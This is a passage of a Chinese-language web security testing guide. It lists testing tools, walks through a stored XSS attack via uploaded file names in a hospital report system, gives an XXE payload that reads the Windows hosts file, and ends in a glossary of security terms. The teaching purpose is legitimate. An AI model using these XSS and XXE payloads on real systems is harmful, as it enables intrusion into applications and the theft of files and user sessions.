\u5ba2\u6237\u7aef\u7684\u8f93\u5165\u662f\u4e0d\u53ef\u4fe1\u7684 \u6211\u7684\u7406\u89e3\u7684\u5224\u65ad\u4f9d\u636e\uff1a 1\u3001\u6211\u4eec\u8bbe\u8ba1\u7684\u7a0b\u5e8f\u7684\u52a8\u4f5c\u662f\u786e\u5b9a\u7684\uff0c\u800c\u7a0b\u5e8f\u8fd0\u884c\u4e2d\u4ea7\u751f\u4e86\u8d85\u51fa\u8fd9\u4e2a\u9884\u671f\u52a8\u4f5c\u7684\u90e8\u5206\uff0c\u6211\u4eec\u90fd\u53ef\u8ba4\u4e3a\u5b83\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u9700\u8981\u6539\u6b63\u7684\u3002 2\u3001\u95ee\u9898\u4ea7\u751f\u5728\u6211\u4eec\u7684\u8bbe\u8ba1\u5f97\u7a0b\u5e8f\u52a8\u4f5c\u672c\u8eab\u5c31\u662f\u4e0d\u7b26\u5408\u73b0\u6709\u7684\u5927\u73af\u5883\u4e0b\u7684\u5b89\u5168\u6807\u51c6\u3002 7. *\u53c2\u8003\u8d44\u6599* \u00b6 http://www.owasp.org.cn/ OWASP \u6d4b\u8bd5\u6307\u5357 http://www.wooyun.org/ http://bbs.51cto.com/thread-1039046-1.html 8. *\u7cfb\u7edf\u7ed3\u6784\u7b80\u56fe* \u00b6 9. *\u6d89\u53ca\u7684\u5e38\u7528\u5de5\u5177* \u00b6 1\u3001Burpsuit 2\u3001Watchweb 3\u3001Httprint 4\u3001Httpwatch 5\u3001Appscan 6\u3001Awvs 7\u3001Nmap 8\u3001Search and replace 9\u3001Sqlmap 10\u3001secureCAT 11\u3001--\u9a8c\u8bc1\u7801\u8bc6\u522b\u5de5\u5177 12\u3001--Whois\u67e5\u8be2 13\u3001DirBuster 14\u3001Fiddler 15\u3001Wireshark 16\u3001Firefox hackbar 17\u3001\u5728\u7ebfjs\u6267\u884c\uff08 http://js.do/ \uff09 9.1. *\u6587\u4ef6\u540d\u4e0a\u4f20XSS* \u00b6 1\u3001\u6b64\u79cd\u95ee\u9898\u7684\u7279\u70b9\uff1a\u9996\u5148\uff0c\u662f\u4e0a\u4f20\u70b9\uff1b\u7b2c\u4e8c\uff0c\u5728\u4e0a\u4f20\u540e\u4f7f\u7528\u4e86\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff08\u53ef\u80fd\u53c8\u6539\u540d\uff0c\u4f46\u662f\u8bb0\u5f55\u4e86\u6587\u4ef6\u540d\uff09\uff1b 2\u3001\u7cfb\u7edf\u95ee\u9898\u53d1\u751f\u70b9\u533b\u751f\u7cfb\u7edf-\u7ec8\u5ba1\u62a5\u544a-\u9644\u4ef6 3\u3001\u6b64\u5904\u7b26\u5408\u4e861\uff0c\u67e5\u770b\u663e\u793a\u6587\u4ef6\u540d\u7684\u754c\u9762\u7684\u4ee3\u7801 aaa.gif \u4ee5\u4e0a\u8bed\u53e52\u5904\u51fa\u73b0\u4e86\u6587\u4ef6\u540d\uff0c\u5373\u6709\u4e24\u4e2a\u5730\u65b9\u662f\u6211\u4eec\u53ef\u80fd\u6ce8\u5165\u4ee3\u7801\u7684\u5730\u65b9 \u5148\u770b\u540e\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u8d85\u94fe\u63a5\u5185\u7684\u6587\u5b57\uff0c\u666e\u901a\u6587\u672c \u8003\u8651\u5c1d\u8bd5\u6700\u7b80\u5355\u7684 alert(1) \uff0c\u5c1d\u8bd5\u8bbe\u7f6e\u6587\u4ef6\u540d\u4e3a alert(1) a.gif \u53d1\u73b0\u5b57\u7b26/\u540e\u7684\u90e8\u5206\u88ab\u4f5c\u4e3a\u4e86\u6587\u4ef6\u540d\uff0c\u8003\u8651\u540e\u53f0\u4ee3\u7801\u6709\u5b57\u7b26\u622a\u65ad\u6216\u8005\u9650\u5236\u957f\u5ea6\u3002\u5e76\u4e14\u786e\u8ba4\u6211\u4eec\u7684\u5b57\u7b26<>\u662f\u63a5\u53d7\u7684\u3002 \u4e0b\u4e00\u6b65\u8bbe\u7f6e\u6587\u4ef6\u540d\u4e3aaaaaaaaaaaa.gif\uff0c\u53d1\u9001\u591a\u6b21\u5c1d\u8bd5\u786e\u8ba4\u6587\u4ef6\u540d\u53ef\u4ee5\u7684\u6700\u957f\u957f\u5ea6\u4e3a24\u4e2a\u5b57\u7b26\uff0c\u4e5f\u5c31\u662f\u540e\u7f00\u524d\u9762\u7684\u4ee3\u7801\u53ea\u80fd\u670920\u4e2a\u5b57\u7b26\u3002 \u518d\u5c1d\u8bd5 b.gif\uff0c\u786e\u8ba4/ \u5931\u8d25\uff0c\u4ec0\u4e48\u539f\u56e0\uff1f\u518d\u5c1d\u8bd5a/b.gif \u786e\u8ba4/\u662f\u6709\u7279\u6b8a\u5904\u7406\u7684\uff0c\u4f1a\u88ab\u622a\u65ad\uff0c\u90a3\u4e48\u5176\u4ed6\u7f16\u7801\u8bd5\u8bd5\uff1f alert(1) alert(2)<%2Fscript> <%2Fscript>\u53ef\u4e0a\u4f20\uff0c\u53ef\u662f\u6574\u4f53\u8d85\u957f <script>alert(3) \u53ef\u4e0a\u4f20\uff0c\u53ef\u662f\u6574\u4f53\u8d85\u957f alert(4) 1 \u53ef\u4e0a\u4f20\uff0c\u53ef\u662f\u6574\u4f53\u8d85\u957f alert(5)<\\u2fscript> \\\u548c/\u540c\u6837\u7684\u6548\u679c <script>alert(6)<\\u002fscript> \\\u548c/\u540c\u6837\u7684\u6548\u679c \u597d\u5427\uff0c\u6362\u4e2a\u601d\u8def\uff1b\u8fd9\u4e2a\u5730\u65b9\u6709\u591a\u4e2a\u6587\u4ef6\u4e0a\u4f20\uff0c\u80fd\u4e0d\u80fd\u7528\u4e24\u4e2a\u6587\u4ef6\u540d\u7ec4\u5408\uff1f\u8bd5\u8bd5 \u4e0a\u4f20<script>a.gif \u518d\u4e0a\u4f20<alert(2)<%2Fscript>b.gif ![img](file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\ksohtml17636\\wps10.jpg) ![img](file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\ksohtml17636\\wps11.jpg) \u5237\u65b0\u754c\u9762\u770b\u4e0b ![img](file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\ksohtml17636\\wps12.jpg) \u8fd8\u662f\u4e0d\u80fd\u6267\u884c\uff0c\u540e\u9762\u7684\u811a\u672c\u90fd\u88ab\u5f53\u6210javascript\u811a\u672c\u5185\u5bb9\u89e3\u6790\u4e86\uff0c%2F\u4e0d\u4f1a\u88ab\u6d4f\u89c8\u5668\u7f16\u7801\u53cd\u89e3\u6790\u56de\u6765\uff1b\u53ea\u80fd\u662f\u5c4f\u853d\u4e86\u4e0b\u9762\u7684\u5230 \u524d\u7684\u6240\u6709\u4ee3\u7801\uff0c\u5176\u5b9e\u8fd9\u91cc\u53ef\u4ee5\u8bf4\u5df2\u7ecf\u662f\u6709\u95ee\u9898\u4e86\uff0c\u6539\u53d8\u4e86\u539f\u6765\u754c\u9762\u7684\u8bed\u4e49 \u8fd9\u4e2a\u4f4d\u7f6e\u7684\u6587\u4ef6\u540d\u8c8c\u4f3c\u884c\u4e0d\u901a\u554a\uff0c\u6211\u4eec\u518d\u6765\u770b\u539f\u59cb\u7684\u4ee3\u7801\uff0c\u518d\u770b\u770b\u7b2c\u4e00\u5904 aaa.gif \u4e24\u79cd\u601d\u8def\uff1aA\uff09\u95ed\u5408a\uff0c\u5728\u540e\u9762\u5f62\u6210\u4ee3\u7801\uff1bB\uff09\u5728\u6807\u7b7e\u5185\u5f62\u6210\u5c5e\u6027\u4e8b\u4ef6 \u5148\u770bB\u601d\u8def\uff0conclick=\"downloadFile('hospital/0100101/2016/06/03/DR/369/20160603140244.gif','aaa.gif')\"\uff0c\u7740\u529b\u70b9\u5728\u8fd9\u91cc\uff0c\u8981\u95ed\u5408\u2019)\u201d\uff0c\u518d\u7ed9\u4e00\u4e2a\u4e8b\u4ef6\u5c5e\u6027\u5982onmouseover=\u201d\u201d \u8bd5\u8bd5\u6587\u4ef6\u540d\u2019)\u201donmouseover=\u201dalert(1)\u201d\uff0c\u5c1d\u8bd5\u540e\u53d1\u73b0\u201d\u548c\u2019\uff0c\u90fd\u662f\u95ee\u9898\u554a\u4f1a\u88ab\u5904\u7406\uff0c\u8fd9\u4e2a\u6ca1\u529e\u6cd5\u89c4\u907f\u554a \u518d\u770b\u770bA\u601d\u8def\u540c\u6837\u907f\u4e0d\u5f00\u2019\u201d\u554a \u5728\u56de\u5934\u770b\u770b\uff0c\u8c01\u8bf4\u6267\u884c\u811a\u672c\u4e0d\u9700\u8981 \u6807\u7b7e\u554a aaa.gif \u6587\u4ef6\u540d\u4e0d\u5305\u542b\u2019\u201d/ \\\uff0c\u53ef\u4ee5\u8003\u8651\u7684\u8fd8\u662f\u6807\u7b7e\u7684\u5c5e\u6027\uff0c\u4e8e\u662f\u770b\u4e8c\u4f4d\u7f6e\u6362\u6210 a.gif\u5982\u4f55 \u518d\u770b\u754c\u9762 OK\uff0cXSS\u6210\u529f\uff0c\u6240\u6709\u67e5\u770b\u8fd9\u4efd\u62a5\u544a\u7684\uff0c\u70b9\u51fb\u4e86\u8fd9\u4e2a\u9644\u4ef6\u7684\u90fd\u4f1a\u6267\u884c\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u5f53\u7136\u4e5f\u53ef\u4ee5\u6362\u6210\u5176\u4ed6\u5c5e\u6027\u89e6\u53d1\u4e8b\u4ef6\u5566\uff0c\u6709\u5174\u8da3\u53ef\u4ee5\u8bd5\u8bd5\u3002 \u8bf7\u4e0d\u8981\u5ffd\u7565\u8fd9\u4e2a\u65ad\u5b57\u7b26\u7684\u4ec5\u80fdalert(1)\u7684\u95ee\u9898\uff0c\u8fd9\u4e2a\u95ee\u9898\u4e5f\u53ef\u80fd\u548c\u5176\u4ed6\u6f0f\u6d1e\u7ed3\u5408\u53d1\u6325\u5927\u7684\u5a01\u529b\u54e6\uff08\u6bd4\u5982\u503c\u540c\u57df\u7136\u540e\u9493\u9c7c\uff09 9.2. *XXE\u6f0f\u6d1e\u8be6\u89e3* \u00b6 \u4ec0\u4e48\u662fXXE ? \u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u6240\u8c13xml\u5b9e\u4f53\u6ce8\u5165\u3002entity\u7ffb\u8bd1\u4e3a\"\u5b9e\u4f53\"\u3002\u5b83\u7684\u4f5c\u7528\u7c7b\u4f3cword\u4e2d\u7684\"\u5b8f\"\uff0c\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3aDW\u4e2d\u7684\u6a21\u677f\uff0c\u4f60\u53ef\u4ee5\u9884\u5148\u5b9a\u4e49\u4e00\u4e2aentity\uff0c\u7136\u540e\u5728\u4e00\u4e2a\u6587\u6863\u4e2d\u591a\u6b21\u8c03\u7528\uff0c\u6216\u8005\u5728\u591a\u4e2a\u6587\u6863\u4e2d\u8c03\u7528\u540c\u4e00\u4e2aentity(XML\u5b9a\u4e49\u4e86\u4e24\u79cd\u7c7b\u578b\u7684entity\u3002\u4e00\u79cd\u662f\u6211\u4eec\u8fd9\u91cc\u8bf4\u7684\u666e\u901aentity\uff0c\u5728XML\u6587\u6863\u4e2d\u4f7f\u7528\uff1b\u53e6\u4e00\u79cd\u662f\u53c2\u6570entity\uff0c\u5728DTD\u6587\u4ef6\u4e2d\u4f7f\u7528\u3002)\u3002 \u53c2\u8003\uff1a http://blog.csdn.net/dongfengkuayue/article/details/50240157 http://drops.wooyun.org/papers/1911 9.2.1. *XXE\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6* \u00b6 \u6784\u9020\u5982\u4e0bxml\u6587\u4ef6 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE file [ \u200b <!ENTITY file SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\"> ]> &file; \u200b &file; *1\u3001\u4f7f\u7528\u6700\u539f\u59cb\u7684javax.xml.parsers\uff0c\u6807\u51c6\u7684jdk api* \u5728\u89e3\u6790\u7ed3\u679c\u603b\u89e3\u6790\u51fa\u4e86hosts\u6587\u4ef6\u7684\u5185\u5bb9\u3002 2\u3001*** *\u4f7f\u7528dom4j\u540e\u7a0b\u5e8f\u53d8\u5f97\u66f4\u7b80\u5355**** 3\u3001*** *\u4f7f\u7528JDOM**** 9.2.2. *XXE\u62d2\u7edd\u670d\u52a1\u653b\u51fb* \u00b6 1\u3001sax\u89e3\u6790\u7c7b\u5df2\u7ecf\u505a\u4e86\u5904\u7406 2\u3001\u5faa\u73af\u8c03\u7528 10. *\u540d\u8bcd\u89e3\u91ca* \u00b6 *WAF* Web\u5e94\u7528\u9632\u62a4\u7cfb\u7edf\uff08\u4e5f\u79f0\uff1a\u7f51\u7ad9\u5e94\u7528\u7ea7\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u3002\u82f1\u6587\uff1aWeb Application Firewall\uff0c\u7b80\u79f0\uff1a WAF\uff09\u3002\u5229\u7528\u56fd\u9645\u4e0a\u516c\u8ba4\u7684\u4e00\u79cd\u8bf4\u6cd5\uff1aWeb\u5e94\u7528\u9632\u706b\u5899\u662f\u901a\u8fc7\u6267\u884c\u4e00\u7cfb\u5217\u9488\u5bf9HTTP/HTTPS\u7684\u5b89\u5168\u7b56\u7565\u6765\u4e13\u95e8\u4e3aWeb\u5e94\u7528\u63d0\u4f9b\u4fdd\u62a4\u7684\u4e00\u6b3e\u4ea7\u54c1\u3002 *\u5355\u70b9\u767b\u9646* \u5355\u70b9\u767b\u5f55\uff08Single Sign On\uff09\uff0c\u7b80\u79f0SSO\uff0c\u662f\u76ee\u524d\u6bd4\u8f83\u6d41\u884c\u7684\u4f01\u4e1a\u4e1a\u52a1\u6574\u5408\u89e3\u51b3\u65b9\u6848\u4e4b\u4e00\u3002SSO\u7684\u5b9a\u4e49\u662f\u5728\u591a\u4e2a\u5e94\u7528\u7cfb\u7edf\u4e2d\uff0c\u7528\u6237\u53ea\u9700\u8981\u767b\u5f55\u4e00\u6b21\u5c31\u53ef\u4ee5\u8bbf\u95ee\u6240\u6709\u6709\u76f8\u4e92\u4fe1\u4efb\u7684\u5e94\u7528\u7cfb\u7edf\u3002 *PR7* PR \u503c\u5168\u79f0\u4e3a Page Rank(\u7f51\u9875\u7ea7\u522b)\uff0c\u53d6\u81eaGoogle\u7684\u521b\u59cb\u4ebaLarry Page \u3002\u5b83\u662fGoogle\u6392\u540d\u8fd0\u7b97\u6cd5\u5219\uff08\u6392\u540d\u516c\u5f0f\uff09\u7684\u4e00\u90e8\u5206\uff0c\u662fGoogle\u7528\u4e8e\u7528\u6765\u6807\u8bc6\u7f51\u9875\u7684\u7b49\u7ea7/\u91cd\u8981\u6027\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u662fGoogle\u7528\u6765\u8861\u91cf\u4e00\u4e2a\u7f51\u7ad9\u7684\u597d\u574f\u7684\u552f\u4e00\u6807\u51c6\u3002\u5728\u63c9\u5408\u4e86\u8bf8\u5982Title\u6807\u8bc6\u548cKeywords\u6807\u8bc6\u7b49\u6240\u6709\u5176\u5b83\u56e0\u7d20\u4e4b\u540e\uff0cGoogle\u901a\u8fc7 Page Rank\u6765\u8c03\u6574\u7ed3\u679c\uff0c\u4f7f\u90a3\u4e9b\u66f4\u5177\u201c\u7b49\u7ea7/\u91cd\u8981\u6027\u201d\u7684\u7f51\u9875\u5728\u641c\u7d22\u7ed3\u679c\u4e2d\u4ee4 \u7f51\u7ad9\u6392\u540d \u83b7\u5f97\u63d0\u5347\uff0c\u4ece\u800c\u63d0\u9ad8\u641c\u7d22\u7ed3\u679c\u7684\u76f8\u5173\u6027\u548c\u8d28\u91cf\u3002\u7ea7\u522b\u4ece1\u523010\u7ea7\uff0c10\u7ea7\u4e3a\u6ee1\u5206\u3002 PR \u503c\u8d8a\u9ad8\u8bf4\u660e\u8be5\u7f51\u9875\u8d8a\u53d7\u6b22\u8fce\uff08\u8d8a\u91cd\u8981\uff09 *OAuth\u6388\u6743* OAuth(\u5f00\u653e\u6388\u6743)\u662f\u4e00\u4e2a\u5f00\u653e\u6807\u51c6\u3002 \u5141\u8bb8\u7b2c\u4e09\u65b9\u7f51\u7ad9\u5728\u7528\u6237\u6388\u6743\u7684\u524d\u63d0\u4e0b\u8bbf\u95ee\u5728\u7528\u6237\u5728\u670d\u52a1\u5546\u90a3\u91cc\u5b58\u50a8\u7684\u5404\u79cd\u4fe1\u606f\u3002 \u800c\u8fd9\u79cd\u6388\u6743\u65e0\u9700\u5c06\u7528\u6237\u63d0\u4f9b\u7528\u6237\u540d\u548c\u5bc6\u7801\u63d0\u4f9b\u7ed9\u8be5\u7b2c\u4e09\u65b9\u7f51\u7ad9\u3002 OAuth\u5141\u8bb8\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u4ee4\u724c\u7ed9\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u4e00\u4e2a\u4ee4\u724c\u5bf9\u5e94\u4e00\u4e2a\u7279\u5b9a\u7684\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u540c\u65f6\u8be5\u4ee4\u724c\u53ea\u80fd\u5728\u7279\u5b9a\u7684\u65f6\u95f4\u5185\u8bbf\u95ee\u7279\u5b9a\u7684\u8d44\u6e90. \u8be6\u7ec6\u53c2\u8003\uff1a http://justcoding.iteye.com/blog/1950270 *REST WebService* REST\uff08Representational State Transfer\uff09\u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684Web Service\u67b6\u6784\u98ce\u683c\uff0c\u5176\u5b9e\u73b0\u548c\u64cd\u4f5c\u660e\u663e\u6bd4SOAP\u548cXML-RPC\u66f4\u4e3a\u7b80\u6d01\uff0c\u53ef\u4ee5\u5b8c\u5168\u901a\u8fc7HTTP\u534f\u8bae\u5b9e\u73b0\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528\u7f13\u5b58Cache\u6765\u63d0\u9ad8\u54cd\u5e94\u901f\u5ea6\uff0c\u6027\u80fd\u3001\u6548\u7387\u548c\u6613\u7528\u6027\u4e0a\u90fd\u4f18\u4e8eSOAP\u534f\u8bae\u3002 *\u9690\u5199\u672f* \u9690\u5199\u672f\u662f\u5173\u4e8e\u4fe1\u606f\u9690\u85cf\uff0c\u5373\u4e0d\u8ba9\u8ba1\u5212\u7684\u63a5\u6536\u8005\u4e4b\u5916\u7684\u4efb\u4f55\u4eba\u77e5\u9053\u4fe1\u606f\u7684\u4f20\u9012\u4e8b\u4ef6\uff08\u800c\u4e0d\u53ea\u662f\u4fe1\u606f\u7684\u5185\u5bb9\uff09\u7684\u4e00\u95e8\u6280\u5de7\u4e0e\u79d1\u5b66\u3002\u9690\u5199\u672f\u82f1\u6587\u4f5c\u201cSteganography\u201d\uff0c\u6765\u6e90\u4e8e\u7ea6\u7ff0\u5c3c\u65af\u00b7\u7279\u91cc\u7279\u7c73\u4e4c\u65af\u7684\u4e00\u672c\u770b\u4e0a\u53bb\u662f\u6709\u5173\u9ed1\u9b54\u6cd5\uff0c\u5b9e\u9645\u4e0a\u662f\u8bb2\u5bc6\u7801\u5b66\u4e0e\u9690\u5199\u672f\u7684\u4e00\u672c\u4e66Steganographia\u4e2d\u3002\u6b64\u4e66\u4e66\u540d\u6765\u6e90\u4e8e\u5e0c\u814a\u8bed\uff0c\u610f\u4e3a\u201c\u9690\u79d8\u4e66\u5199\u201d\u3002 *CTF* CTF\uff08Capture the Flag\uff09\u593a\u65d7\u6bd4\u8d5b\u3002 *MIME\u7f16\u7801* MIME\uff08Multipurpose Internet Mail Extensions\uff09\u591a\u90e8\u5206(multi-part)\u3001\u591a\u5a92\u4f53\u7535\u5b50\u90ae\u4ef6\u548cWWW\u8d85\u6587\u672c\u7684\u4e00\u79cd\u7f16\u7801\u6807\u51c6\uff0c\u7528\u4e8e\u4f20\u9001\u8bf8\u5982\u56fe\u5f62\u3001\u58f0\u97f3\u548c\u4f20\u771f\u7b49\u975e\u6587\u672c\u6570\u636e\u3002 *PKCS* The Public-Key Cryptography Standards (PKCS)\u662f\u7531\u7f8e\u56fdRSA\u6570\u636e\u5b89\u5168\u516c\u53f8\u53ca\u5176\u5408\u4f5c\u4f19\u4f34\u5236\u5b9a\u7684\u4e00\u7ec4\u516c\u94a5\u5bc6\u7801\u5b66\u6807\u51c6\uff0c\u5176\u4e2d\u5305\u62ec\u8bc1\u4e66\u7533\u8bf7\u3001\u8bc1\u4e66\u66f4\u65b0\u3001\u8bc1\u4e66\u4f5c\u5e9f\u8868\u53d1\u5e03\u3001\u6269\u5c55\u8bc1\u4e66\u5185\u5bb9\u4ee5\u53ca\u6570\u5b57\u7b7e\u540d\u3001\u6570\u5b57\u4fe1\u5c01\u7684\u683c\u5f0f\u7b49\u65b9\u9762\u7684\u4e00\u7cfb\u5217\u76f8\u5173\u534f\u8bae\u3002 PKCS#1\uff1a\u5b9a\u4e49RSA\u516c\u5f00\u5bc6\u94a5\u7b97\u6cd5\u52a0\u5bc6\u548c\u7b7e\u540d\u673a\u5236\uff0c\u4e3b\u8981\u7528\u4e8e\u7ec4\u7ec7PKCS#7\u4e2d\u6240\u63cf\u8ff0\u7684\u6570\u5b57\u7b7e\u540d\u548c\u6570\u5b57\u4fe1\u5c01\u3002 *WASC* Web Application Security Consortium\uff08WASC\uff09\uff0c\u662f\u4e00\u4e2a\u7531\u5b89\u5168\u4e13\u5bb6\u3001\u884c\u4e1a\u987e\u95ee\u548c\u8bf8\u591a\u7ec4\u7ec7\u7684\u4ee3\u8868\u7ec4\u6210\u7684\u56fd\u9645\u56e2\u4f53\u3002WASC \u7ec4\u7ec7\u7684\u5173\u952e\u9879\u76ee\u4e4b\u4e00\u662f\u201cWeb \u5b89\u5168\u5a01\u80c1\u5206\u7c7b\u201d\uff0c\u4e5f\u5c31\u662f\u5c06 Web \u5e94\u7528\u6240\u53d7\u5230\u7684\u5a01\u80c1\u3001\u653b\u51fb\u8fdb\u884c\u8bf4\u660e\u5e76\u5f52\u7eb3\u6210\u5177\u6709\u5171\u540c\u7279\u5f81\u7684\u5206\u7c7b\u3002\u8be5\u9879\u76ee\u7684\u76ee\u7684\u662f\u9488\u5bf9 Web \u5e94\u7528\u7684\u5b89\u5168\u9690\u60a3\uff0c\u5236\u5b9a\u548c\u63a8\u5e7f\u884c\u4e1a\u6807\u51c6\u672f\u8bed\u3002 *OWASP* Open Web Application Security Project\uff08OWASP\uff09\uff0c\u8be5\u7ec4\u7ec7\u81f4\u529b\u4e8e\u53d1\u73b0\u548c\u89e3\u51b3\u4e0d\u5b89\u5168 Web \u5e94\u7528\u7684\u6839\u672c\u539f\u56e0\u3002\u5b83\u4eec\u6700\u91cd\u8981\u7684\u9879\u76ee\u4e4b\u4e00\u662f\u201cWeb \u5e94\u7528\u7684\u5341\u5927\u5b89\u5168\u9690\u60a3\u201d\uff0c\u603b\u7ed3\u4e86\u76ee\u524d Web \u5e94\u7528\u6700\u5e38\u53d7\u5230\u7684\u5341\u79cd\u653b\u51fb\u624b\u6bb5\uff0c\u5e76\u4e14\u6309\u7167\u653b\u51fb\u53d1\u751f\u7684\u6982\u7387\u8fdb\u884c\u4e86\u6392\u5e8f\u3002\u8fd9\u4e2a\u9879\u76ee\u7684\u76ee\u7684\u662f\u7edf\u4e00\u4e1a\u754c\u6700\u5173\u952e\u7684 Web \u5e94\u7528\u5b89\u5168\u9690\u60a3\uff0c\u5e76\u4e14\u52a0\u5f3a\u4f01\u4e1a\u5bf9 Web \u5e94\u7528\u5b89\u5168\u7684\u610f\u8bc6\u3002 *CORS* CORS(Cross Origin Resourse-Sharing)\uff0c\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u3002 *Node.js* Node.js\u662f\u4e00\u4e2aJavascript\u8fd0\u884c\u73af\u5883(runtime)\u3002 \u5b9e\u9645\u4e0a\u5b83\u662f\u5bf9Google V8\u5f15\u64ce\u8fdb\u884c\u4e86\u5c01\u88c5\u3002V8\u5f15 \u64ce\u6267\u884cJavascript\u7684\u901f\u5ea6\u975e\u5e38\u5feb\uff0c\u6027\u80fd\u975e\u5e38\u597d\u3002Node.js\u5bf9\u4e00\u4e9b\u7279\u6b8a\u7528\u4f8b\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u63d0\u4f9b\u4e86\u66ff\u4ee3\u7684API\uff0c\u4f7f\u5f97V8\u5728\u975e\u6d4f\u89c8\u5668\u73af\u5883\u4e0b\u8fd0\u884c\u5f97\u66f4 \u597d\u3002 [1] Node.js\u662f\u4e00\u4e2a\u57fa\u4e8eChrome JavaScript\u8fd0\u884c\u65f6\u5efa\u7acb\u7684\u5e73\u53f0\uff0c \u7528\u4e8e\u65b9\u4fbf\u5730\u642d\u5efa\u54cd\u5e94\u901f\u5ea6\u5feb\u3001\u6613\u4e8e\u6269\u5c55\u7684\u7f51\u7edc\u5e94\u7528\u3002Node.js \u4f7f\u7528 \u4e8b\u4ef6\u9a71\u52a8 \uff0c \u975e\u963b\u585e I/O \u6a21\u578b\u800c\u5f97\u4ee5\u8f7b\u91cf\u548c\u9ad8\u6548\uff0c\u975e\u5e38\u9002\u5408\u5728\u5206\u5e03\u5f0f\u8bbe\u5907\u4e0a\u8fd0\u884c\u7684\u6570\u636e\u5bc6\u96c6\u578b\u7684\u5b9e\u65f6\u5e94\u7528\u3002 *SSRF* SSRF(Server-Side Request Forgery:\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020) \u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF\u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002\uff08\u6b63\u662f\u56e0\u4e3a\u5b83\u662f\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u7684\uff0c\u6240\u4ee5\u5b83\u80fd\u591f\u8bf7\u6c42\u5230\u4e0e\u5b83\u76f8\u8fde\u800c\u4e0e\u5916\u7f51\u9694\u79bb\u7684\u5185\u90e8\u7cfb\u7edf\uff09 \u6e17\u900f\u653b\u51fb\u3001\u653b\u51fb\u8f7d\u8377payload\u3001shellcode *CWE* CWE(Common Weakness Enumeration),\u901a\u7528\u5f31\u70b9\u679a\u4e3e\u3002\u8f6f\u4ef6\u5f31\u70b9\u5206\u7c7b\uff0c\u66f4\u597d\u5730\u8bc6\u522b\u7f3a\u9677\u3001\u4fee\u590d\u963b\u6b62\u7f3a\u9677\u5b9e\u73b0\u81ea\u52a8\u5316\u3002 *CDN* CDN(ConTent Deliver network)\u5185\u5bb9\u5206\u53d1\u7f51\u7edc\u3002\u4ee5\u8d1f\u8f7d\u5747\u8861\u4e3a\u6838\u5fc3\u3002 *Maven* Maven\u9879\u76ee\u5bf9\u8c61\u6a21\u578b\uff08POM\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e00\u5c0f\u6bb5\u63cf\u8ff0\u4fe1\u606f\u6765\u7ba1\u7406\u9879\u76ee\u7684\u6784\u5efa\uff0c\u62a5\u544a\u548c\u6587\u6863\u7684\u8f6f\u4ef6\u9879\u76ee\u7ba1\u7406\u5de5\u5177\u3002 *WebRTC* WebRTC\uff08Web Real-Time Commutication\uff09Web\u5b9e\u65f6\u901a\u8baf\u7684\u7f29\u5199\uff0c\u5c31\u662f\u4f7f\u7528Web\u6d4f\u89c8\u5668\u5b8c\u6210\u5b9e\u65f6\u7684\u8bed\u97f3\u5bf9\u8bdd\u548c\u89c6\u5c4f\u5bf9\u8bdd\u7684\u6280\u672f\u3002 *APT* APT\uff08Advance Persistent Thread\uff09\u9ad8\u7ea7\u53ef\u6301\u7eed\u6027\u653b\u51fb\u3002APT\u662f\u9ed1\u5ba2\u4ee5\u7a83\u53d6\u6838\u5fc3\u8d44\u6599\u4e3a\u76ee\u7684\uff0c\u9488\u5bf9\u5ba2\u6237\u6240\u53d1\u52a8\u7684\u7f51\u7edc\u653b\u51fb\u548c\u4fb5\u88ad\u884c\u4e3a\uff0c\u662f\u4e00\u79cd\u84c4\u8c0b\u5df2\u4e45\u7684\u201c\u6076\u610f\u5546\u4e1a\u95f4\u8c0d\u5a01\u80c1\u201d\u3002\u8fd9\u79cd\u884c\u4e3a\u5f80\u5f80\u7ecf\u8fc7\u957f\u671f\u7684\u7ecf\u8425\u4e0e\u7b56\u5212\uff0c\u5e76 \u5177\u5907\u9ad8\u5ea6\u7684\u9690\u853d\u6027\u3002APT\u7684\u653b\u51fb\u624b\u6cd5\uff0c\u5728\u4e8e\u9690\u533f\u81ea\u5df1\uff0c\u9488\u5bf9\u7279\u5b9a\u5bf9\u8c61\uff0c\u957f\u671f\u3001\u6709\u8ba1\u5212\u6027\u548c\u7ec4\u7ec7\u6027\u5730\u7a83\u53d6\u6570\u636e\uff0c\u8fd9\u79cd\u53d1\u751f\u5728\u6570\u5b57\u7a7a\u95f4\u7684\u5077\u7a83\u8d44\u6599\u3001\u641c\u96c6\u60c5\u62a5\u7684\u884c\u4e3a\uff0c \u5c31\u662f\u4e00\u79cd\u201c\u7f51\u7edc\u95f4\u8c0d\u201d\u7684\u884c\u4e3a\u3002 *CVSS* Common Vulnerability Scoring 